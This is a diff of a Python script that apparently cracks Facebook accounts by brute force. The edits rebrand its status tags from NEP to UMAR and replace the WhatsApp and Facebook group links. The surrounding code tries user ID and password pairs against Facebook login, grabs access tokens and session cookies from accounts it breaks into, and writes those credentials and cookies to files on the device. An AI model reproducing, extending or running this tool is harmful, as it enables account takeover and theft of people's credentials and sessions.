@@ -49,7 +49,7 @@ except Exception as e:
 from concurrent.futures import ThreadPoolExecutor as tpe
 import requests
 from requests.exceptions import ConnectionError as CE
-os.system('xdg-open https://chat.whatsapp.com/F228l8aT3H5LHLNUfHOrBT')
+os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
 
 try:
 	key = open(".key.txt","r").read()
@@ -473,14 +473,14 @@ class iAmMain:
 				if "session_key" in q:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-					p('\r\033[1;92m[NEP-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 					ok.append(uid)
-					open('/sdcard/NEP_M1_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/NEP_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M1_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[NEP-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/NEP_M1_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -494,7 +494,7 @@ class iAmMain:
 	def method2(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [NEP] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -770,12 +770,12 @@ class iAmMain:
 class Join:
 	def __init_(self):
 		logo()
-		#s.system("xdg-open https://wa.me/+923152056613").
+		#s.system("xdg-open https://wa.me/+923021431324").
 	def Whatsapp(self):
-		os.system('xdg-open https://chat.whatsapp.com/HF3burNYuZx0den94ooYbk')
+		os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
 		iAmMain().iAmMenu()
 	def Facebook(self):
-		os.system('xdg-open https://facebook.com/groups/124939013896146/')
+		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
 		iAmMain().iAmMenu()
 
 class Grep:
